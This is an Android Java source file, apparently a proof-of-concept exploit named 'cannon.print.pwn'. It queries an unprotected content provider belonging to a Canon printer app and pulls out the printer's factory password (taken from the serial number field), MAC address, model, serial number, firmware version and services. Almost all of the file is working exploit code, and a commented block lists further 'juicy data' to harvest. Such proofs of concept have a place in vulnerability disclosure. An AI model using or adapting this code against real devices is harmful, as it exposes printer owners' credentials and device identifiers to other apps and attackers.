package cannon.print.pwn;

import android.database.Cursor;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import org.apache.commons.lang3.StringUtils; // https://stackoverflow.com/a/50198499

public class MainActivity extends AppCompatActivity {

    Button PwnBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        PwnBtn = (Button) findViewById(R.id.button);
        PwnBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Toast.makeText(getApplicationContext(), "Payload triggered ...", Toast.LENGTH_SHORT).show();
                Uri cannonURI = Uri.parse("content://canon.ij.printer.capability.data/");
                Cursor cursor = getContentResolver().query(cannonURI, null, null, null, null);
                int count  = cursor.getCount();
                TextView data=(TextView)findViewById(R.id.data);
                data.setText(String.valueOf(count));
                cursor.moveToFirst();
                String tempstr = " ";
                tempstr ="  "+tempstr +"\t"+ cursor.getString(0) + "\t\t\t"
                        + cursor.getString(1) + "\t\t\t" + cursor.getString(2);
                String dpw = StringUtils.substringBetween(tempstr, "<ivec:product_serialnumber>", "</ivec:product_serialnumber>");
                String dmac = cursor.getString(4);
                String mdeviceid = cursor.getString(13); // raw
                String dtype = StringUtils.substringBetween(mdeviceid, ";CLS:", ";DES");
                String timestamp = cursor.getString(15); // ticks, device last used
                String dclass = StringUtils.substringBetween(tempstr, "<ivec:manufacturer>", "</ivec:manufacturer>");
                String dmodel = StringUtils.substringBetween(tempstr, "<ivec:model>", "</ivec:model>");
                String dserial = StringUtils.substringBetween(tempstr, "<ivec:serialnumber>", "</ivec:serialnumber>");
                String dfmver = StringUtils.substringBetween(tempstr, "<ivec:firmver>", "</ivec:firmver>");
                String dservice = StringUtils.substringBetween(tempstr, "<ivec:service>", "</ivec:service>");
                /* More juicy data
                String denv = StringUtils.substringBetween(tempstr, "<vcn:host_environment>", "</vcn:host_environment>");
                String dpapertype = StringUtils.substringBetween(tempstr, "<ivec:papertype>", "</ivec:papertype>");
                String dformats = StringUtils.substringBetween(tempstr, "<ivec:support_data_format>", "</ivec:support_data_format>");
                */
                String fout = String.format("Device Type : %s\nDevice Class : %s\nDevice Model : %s\nDevice Serial : %s\nDevice MAC Address : %s\nDevice Factory Password : %s\nDevice Firmware Version : %s\nDevice Services : %s\nDevice Last Used : %s\n", dtype, dclass, dmodel, dserial, dmac, dpw, dfmver, dservice, timestamp);
                data.setText(fout);
            }
        });
    }
}


